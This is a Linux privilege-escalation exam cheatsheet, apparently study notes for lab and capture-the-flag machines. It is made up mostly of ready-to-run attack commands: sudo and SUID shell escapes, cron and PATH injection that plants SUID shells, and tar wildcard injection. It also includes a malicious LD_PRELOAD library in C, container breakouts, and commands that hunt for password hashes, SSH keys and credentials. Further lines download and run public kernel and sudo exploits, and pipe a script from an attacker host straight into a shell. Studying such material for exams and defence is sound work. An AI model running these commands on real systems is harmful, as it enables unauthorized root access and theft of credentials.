# 00 — Linux Privilege Escalation · EXAM CHEATSHEET

> Fast reference for the whole module (§01–28). Through-line:
> **`sudo -l` → SUID → cron → creds → groups → kernel/CVE.** Enumerate at every privilege level — each step reveals the next.

---

## 0 · First 60 Seconds (run on EVERY shell)

```bash
id; whoami; hostname; sudo -l 2>/dev/null     # who am I, what can I sudo — #1 fastest win
uname -r; cat /etc/os-release | head -4       # kernel + distro → public exploits
cat ~/.bash_history 2>/dev/null | head -30     # cleartext creds in command history
ls -la ~; ls -la ~/.config/ ~/.ssh/ 2>/dev/null  # hidden files, SSH keys, configs
```

### Full Enum One-Liner

```bash
echo "== ID =="; id; sudo -l 2>/dev/null
echo "== OS =="; uname -r; cat /etc/os-release 2>/dev/null | head -3
echo "== USERS =="; cat /etc/passwd | grep -E 'sh$'; who
echo "== SUID =="; find / -perm -4000 -type f 2>/dev/null | grep -v snap
echo "== CRON =="; cat /etc/crontab 2>/dev/null; ls -la /etc/cron.d/ 2>/dev/null
echo "== CAPS =="; getcap -r / 2>/dev/null
echo "== WRITABLE =="; find / -path /proc -prune -o -type f -perm -o+w -print 2>/dev/null | grep -vE 'proc|sys|snap'
echo "== SHADOW =="; cat /etc/shadow 2>/dev/null | head
echo "== KEYS =="; find / \( -name 'id_rsa' -o -name 'authorized_keys' \) -readable 2>/dev/null
echo "== HISTORY =="; find /home -name '.bash_history' -readable -exec echo {} \; -exec head -20 {} \; 2>/dev/null
```

### Automated Helpers

```bash
# linpeas (best all-in-one)
curl http://$LH:8000/linpeas.sh | sh                # or transfer and run
# pspy — watch processes/cron without root
pspy                                                  # apt-installed on Kali, transfer to target
# linux-exploit-suggester
linux-exploit-suggester                               # maps uname -a → kernel CVEs
```

---

## 1 · Sudo Rights Abuse (§9) — CHECK FIRST, ALWAYS

```bash
sudo -l                                       # THE moneymaker
# → (root) NOPASSWD: /usr/bin/vim             # check GTFOBins
```

**GTFOBins lookup:** https://gtfobins.github.io/ — search for the binary name → Sudo section.

| Sudo Entry | Exploit |
|-----------|---------|
| `vim/vi` | `sudo vim -c ':!/bin/sh'` |
| `find` | `sudo find / -exec /bin/sh \;` |
| `awk` | `sudo awk 'BEGIN {system("/bin/sh")}'` |
| `less/more/man` | `sudo less /etc/hosts` → `!/bin/sh` |
| `tcpdump` | `sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/rev.sh` |
| `env` | `sudo env /bin/sh` |
| `busctl/journalctl/systemctl` | pager escape: `!/bin/sh` (needs TTY) |
| Any binary | If `SETENV:` → `sudo LD_PRELOAD=/tmp/root.so /usr/bin/cmd` (§20) |
| Any python script | If `SETENV:` → `sudo PYTHONPATH=/tmp /usr/bin/python3 script.py` (§22) |

---

## 2 · SUID / SGID + GTFOBins (§8)

```bash
find / -perm -4000 -type f 2>/dev/null        # SUID
find / -perm -2000 -type f 2>/dev/null        # SGID
```

Flag anything non-standard. Check GTFOBins for each. Common wins:

| Binary | Exploit |
|--------|---------|
| Custom/unknown SUID | `strings binary`, `strace binary`, `ltrace binary` → find vuln |
| `screen-4.5.0` | CVE-2017-5618 — `screenroot.sh` (§12) |
| `pkexec 0.105` | CVE-2021-4034 PwnKit (§24) — compile PoC, instant root |
| `passwd/chsh/gpasswd` | Standard — not usually exploitable |

---

## 3 · Cron Job Abuse (§13)

```bash
cat /etc/crontab; ls -la /etc/cron.d/; crontab -l 2>/dev/null
# Monitor live:
pspy                                           # see cron fire in real-time
```

**Attack:** root cron runs script → script/dir is writable → inject your command.

```bash
# Writable script
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/to/cron_script.sh
# After cron fires:
/tmp/rootbash -p                               # root shell

# Relative PATH in cron
echo '#!/bin/bash' > /tmp/cmd_name; echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /tmp/cmd_name
chmod +x /tmp/cmd_name
# Cron's PATH searches /tmp before /usr/bin → your script runs as root
```

---

## 4 · Credential Hunting (§4)

```bash
# Bash history (ALL users)
find /home -name '.bash_history' -readable -exec cat {} \; 2>/dev/null
cat /root/.bash_history 2>/dev/null

# Config files
grep -rniE 'password|passwd|pwd|secret|api.key|token' /var/www /etc /opt /home 2>/dev/null | grep -v Binary | head -30
find / -name '*.conf' -o -name '*.config' -o -name '*.cnf' -o -name '*.bak' -o -name '*.old' 2>/dev/null | grep -v /proc

# SSH keys
find / \( -name 'id_rsa*' -o -name '*.pem' \) -readable 2>/dev/null

# Shadow / inline hashes
cat /etc/shadow 2>/dev/null                    # readable? → crack all hashes
grep -vE ':[x*!]+:' /etc/passwd | grep -E '\$[0-9]'  # hash in passwd (embedded/routers)

# Hidden files
find / -name '.*' -type f -readable 2>/dev/null | grep -vE 'proc|sys|snap'
```

> **Creds found anywhere → reuse-test** with `su`, SSH, other services. `sshpass`, `mysql -p`, `curl -u` in history = cleartext passwords.

---

## 5 · Privileged Groups (§10)

```bash
id; groups
```

| Group | Technique |
|-------|-----------|
| **sudo/wheel** | `sudo su` or `sudo -i` (need password) |
| **docker** | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` → host root FS |
| **lxd/lxc** | Import Alpine image → `security.privileged=true` → mount host `/` (§14) |
| **disk** | `debugfs /dev/sda1` → `cat /etc/shadow`, `cat /root/.ssh/id_rsa` |
| **adm** | `grep -rsi 'flag\|pass' /var/log` — read all logs (apache, auth, mysql) |
| **shadow** | `cat /etc/shadow` → offline crack with hashcat/john |
| **video** | `cat /dev/fb0 > /tmp/screen.raw` → framebuffer screenshot |

---

## 6 · Capabilities (§11)

```bash
getcap -r / 2>/dev/null
```

| Capability | Binary | Exploit |
|-----------|--------|---------|
| `cap_setuid+ep` | `vim/python/perl` | Set UID to 0 → root shell |
| `cap_dac_read_search` | Any binary | Read any file (bypass permissions) |
| `cap_net_bind_service` | — | Bind to privileged ports (<1024) |

```bash
# Example: vim with cap_setuid
/usr/bin/vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh","sh")'

# Example: python3 with cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

## 7 · Path Abuse (§5)

```bash
echo $PATH                                     # current PATH order
# If a script/cron uses a command without absolute path AND you control a PATH dir:
export PATH=/tmp:$PATH                         # prepend writable dir
echo '#!/bin/bash' > /tmp/cmd_name; echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /tmp/cmd_name
chmod +x /tmp/cmd_name
# Run the vulnerable script → your cmd_name executes first
```

---

## 8 · Wildcard Abuse (§6)

Tar with wildcards in cron: `tar czf /tmp/backup.tar.gz *`

```bash
# In the directory tar operates on:
echo '' > '--checkpoint=1'
echo '' > '--checkpoint-action=exec=sh shell.sh'
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh
```

> Filenames starting with `--` are interpreted as tar flags. Works with `chown`, `rsync`, etc.

---

## 9 · Shared Libraries & Objects (§20-22)

### LD_PRELOAD (§20) — `env_keep+=LD_PRELOAD` in sudo

```bash
# Compile malicious .so
cat > /tmp/root.c << 'C'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0); setuid(0);
  system("/bin/bash");
}
C
gcc -fPIC -shared -o /tmp/root.so /tmp/root.c -nostartfiles
sudo LD_PRELOAD=/tmp/root.so /usr/bin/any_sudo_cmd
```

### Shared Object Hijacking (§21) — writable RUNPATH

```bash
ldd ./suid_binary                              # find non-standard .so files
readelf -d ./suid_binary | grep PATH           # RUNPATH writable?
# Replace .so: implement expected function → setuid(0); system("/bin/sh -p");
gcc hijack.c -fPIC -shared -o /development/libshared.so
./suid_binary                                  # root shell
```

### Python Library Hijacking (§22)

```bash
# Vector 1: writable imported module → inject code into called function
# Vector 2: writable dir higher in sys.path → drop fake module
# Vector 3: SETENV: in sudo → sudo PYTHONPATH=/tmp python3 script.py
```

---

## 10 · Containers (§14-16)

### LXD/LXC (§14) — user in lxd group

```bash
lxd init                                       # accept defaults
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
lxc init alpine r00t -c security.privileged=true
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
lxc start r00t
lxc exec r00t /bin/sh
cat /mnt/root/root/flag.txt                    # host filesystem mounted
```

### Docker (§15) — user in docker group

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh   # full host root
```

### Kubernetes (§16) — check for accessible API/kubelet

```bash
curl -sk https://localhost:10250/pods           # kubelet API
curl -sk https://localhost:6443/api             # API server
kubectl auth can-i --list                       # what can we do?
```

---

## 11 · Kernel & CVE Exploits (§19, 23-26)

### Decision Tree

```
uname -r →
├── Kernel 2.6–3.x    → Dirty COW (CVE-2016-5195)
├── Kernel 3.13–4.4   → OverlayFS (CVE-2021-3493, Ubuntu-specific)
├── Kernel 5.8–5.16   → Dirty Pipe (CVE-2022-0847) §25
├── Kernel 2.6–5.11   → Netfilter CVE-2021-22555 (gcc -m32 -static) §26
├── Kernel ≤6.3.1     → Netfilter CVE-2023-32233 (-lmnl -lnftnl) §26
└── Any               → Check below ↓

pkexec --version →
└── 0.105 (pre-2022)  → PwnKit CVE-2021-4034 §24 (needs gcc on target or static compile)

sudo -V | head -1 →
├── < 1.8.28          → CVE-2019-14287: sudo -u#-1 /cmd (needs (ALL, !root) pattern) §23
└── 1.8.2–1.9.5p1     → Baron Samedit CVE-2021-3156 (heap overflow, any user) §23

sudoedit -s / →
└── "sudoedit: /"     → Baron Samedit vulnerable
└── "usage: sudoedit" → patched
```

### Quick Exploits

```bash
# PwnKit (CVE-2021-4034) — most universal, any user, needs gcc on target
curl -s https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c -o poc.c
gcc poc.c -o poc && ./poc                      # instant root

# Dirty Pipe (CVE-2022-0847) — kernel 5.8-5.16
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
bash compile.sh
./exploit-2 /usr/bin/sudo                      # drops SUID shell at /tmp/sh
echo 'cat /root/flag.txt' | /tmp/sh

# OverlayFS (CVE-2021-3493) — Ubuntu with kernel 3.13-5.11
# Compile ovl_exploit.c → ./ovl → root

# Sudo bypass (CVE-2019-14287) — sudo < 1.8.28 with (ALL, !root) pattern
sudo -u#-1 /bin/bash                           # UID -1 wraps to 0 (root)
```

---

## 12 · Miscellaneous Techniques (§17-18)

### NFS no_root_squash (§18)

```bash
cat /etc/exports                               # look for no_root_squash
showmount -e $T                                # from Kali
sudo mount -t nfs $T:/share /mnt
# As root on Kali: compile SUID shell, copy to mount
sudo gcc -o /mnt/shell shell.c && sudo chmod +s /mnt/shell
# On target: /share/shell → root
```

### Tmux Session Hijacking (§18)

```bash
tmux ls                                        # list sessions
ps aux | grep tmux                             # find root's tmux socket
ls -la /tmp/tmux-0/                            # group-accessible?
tmux -S /tmp/tmux-0/default attach             # attach to root's session
```

### Logrotate (§17) — logrotten

```bash
# If logrotate 3.8.6/3.11.0/3.15.0/3.18.0 + writable log dir
git clone https://github.com/whotwagner/logrotten.git
gcc logrotten.c -o logrotten
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /tmp/payload
./logrotten -p /tmp/payload /path/to/writable.log
# Trigger log rotation → /tmp/rootbash -p
```

---

## 13 · Restricted Shell Escape (§7)

```bash
# Try these in order:
bash; /bin/bash; sh; /bin/sh                   # direct invocation
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
python3 -c 'import os; os.system("/bin/bash")'
vi → :set shell=/bin/bash → :shell
awk 'BEGIN {system("/bin/bash")}'
find / -exec /bin/bash \;
# SSH escape:
ssh user@localhost -t bash                     # force TTY + bash
```

---

## 14 · Pager / Interactive Program Shell Escapes

Many sudo-allowed or SUID programs use `less` as a pager. Once in `less`:

```
!/bin/sh                                       # shell escape from less/more/man
```

| Program | Shell Escape |
|---------|-------------|
| `less/more` | `!/bin/sh` |
| `man` | `!/bin/sh` |
| `vi/vim` | `:!/bin/sh` or `:set shell=/bin/sh` then `:shell` |
| `ncdu` | `b` key → spawns shell |
| `nmap --interactive` | `!sh` |
| `busctl/journalctl/systemctl` | `!/bin/sh` (uses less internally) |
| `ftp/gdb` | `!sh` |

---

## 15 · Compilation Quick Reference

```bash
# Shared library (.so) — for LD_PRELOAD
gcc -fPIC -shared -o lib.so exploit.c -nostartfiles

# Shared object replacement — for RUNPATH hijack
gcc -fPIC -shared -o libname.so exploit.c      # NO -nostartfiles (named function)

# SUID shell helper
cat > /tmp/shell.c << 'C'
#include <unistd.h>
int main() { setuid(0); setgid(0); execl("/bin/sh","sh","-p",NULL); }
C
gcc -o /tmp/shell /tmp/shell.c

# Static compile (cross-compile for target without matching GLIBC)
gcc -static exploit.c -o exploit

# No gcc on target? Compile on Kali, transfer. Or use python/scripting exploits.
```

---

## 16 · Priority Checklist (exam order)

```
1. sudo -l                      → GTFOBins / env_keep / SETENV (§9, §20, §22)
2. id / groups                  → docker/lxd/disk/adm/shadow (§10, §14-15)
3. SUID binaries                → GTFOBins / custom binary analysis (§8)
4. Cron jobs + pspy             → writable scripts / PATH abuse / wildcards (§13, §5-6)
5. Capabilities                 → cap_setuid on vim/python/perl (§11)
6. Credential hunting           → history, configs, .bak files, hidden files (§4)
7. Writable files/dirs          → scripts run by root, library paths (§20-22)
8. NFS exports                  → no_root_squash (§18)
9. Tmux/screen sessions         → hijack root's session (§18)
10. Kernel version               → CVE lookup: PwnKit/DirtyPipe/OverlayFS/Netfilter (§19, 23-26)
11. Sudo/pkexec/polkit versions  → CVE-2019-14287 / Baron Samedit / PwnKit (§23-24)
```

> **Kernel exploits = last resort.** They can crash the box. Try everything above first. On the exam, save your work before running kernel exploits.

---

## 17 · Transfer Cheatsheet

```bash
# Kali → Target
python3 -m http.server 8000                    # on Kali
wget http://$LH:8000/file -O /tmp/file         # on target (Linux)
curl http://$LH:8000/file -o /tmp/file         # alternative

# SCP (if you have SSH creds)
scp file user@target:/tmp/
scp -r exploit_dir/ user@target:/tmp/

# If no wget/curl on target
bash -c 'cat < /dev/tcp/KALI_IP/8000 > /tmp/file'  # bash built-in
```

---

## 18 · GOTCHAS (hard-won lessons from this module)

- **`/bin/sh -p`** preserves SUID. `/bin/bash` drops privileges by default. Always use `-p` with SUID exploits.
- **`sed -i` fails** if you can write the file but not create temp files in its parent dir. Use python file I/O instead (§22).
- **GLIBC mismatch**: compile on target when possible. If cross-compiling, use `-static`. Transfer source + compile on target is safest.
- **No gcc on target**: use scripting exploits (Python, bash), pre-compiled binaries, or PwnKit (which needs gcc at runtime for its helper .so).
- **Non-interactive shells** can't use pager escapes. Use `expect`, python `pty.openpty()`, or get a proper reverse shell first.
- **`env_reset` in sudo** strips environment variables. `LD_PRELOAD` only works if `env_keep+=LD_PRELOAD` is explicitly set. `PYTHONPATH` only works with `SETENV:`.
- **URL-decode** findings from log files (`%20`=space, `%3D`=`=`, `%21`=`!`).
- **Hidden files** (dot-prefix) are missed by `ls` without `-a`. Always use `ls -la` and check `.config/`, `.local/`, `.ssh/`.
- **Bash history** is the #1 credential source on HTB boxes — check ALL users, not just yours.
- **Enumerate at EVERY privilege level.** Lateral movement (user→user) often reveals the path to root.
